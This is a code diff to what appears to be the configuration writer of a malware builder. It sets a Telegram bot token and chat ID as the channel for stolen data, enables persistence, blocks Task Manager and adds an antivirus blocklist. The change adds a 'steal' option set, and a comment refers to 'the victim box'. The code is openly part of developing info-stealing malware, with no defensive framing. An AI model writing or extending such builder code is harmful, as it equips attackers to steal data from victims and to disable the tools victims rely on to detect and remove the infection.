@@ -31,7 +31,8 @@ HERE = os.path.dirname(os.path.abspath(__file__))
 
 
 def write_cfg(bot_token: str, chat_id: str, *, licence_key: str = "",
-              licence_url: str = "", **overrides) -> str:
+              licence_url: str = "", steal: dict | None = None,
+              opts: dict | None = None, cfg_path: str | None = None, **overrides) -> str:
     cfg = {
         "bot_token": bot_token.strip(),
         "chat_id": str(chat_id).strip(),
@@ -43,10 +44,12 @@ def write_cfg(bot_token: str, chat_id: str, *, licence_key: str = "",
         "persistence_enabled": overrides.get("persistence_enabled", True),
         "block_taskmgr": overrides.get("block_taskmgr", True),
         "av_blocklist": overrides.get("av_blocklist", True),
+        "steal": steal or {},
+        "opts": opts or {},
     }
     # Validate shape before writing, so a typo fails here not on the victim box.
     import jwg_cfg
-    tmp = os.path.join(HERE, "cfg.json")
+    tmp = cfg_path or os.path.join(HERE, "cfg.json")
     json.dump(cfg, open(tmp, "w", encoding="utf-8"), indent=2)
     try:
         jwg_cfg.load(tmp)   # raises ConfigError on bad token/chat
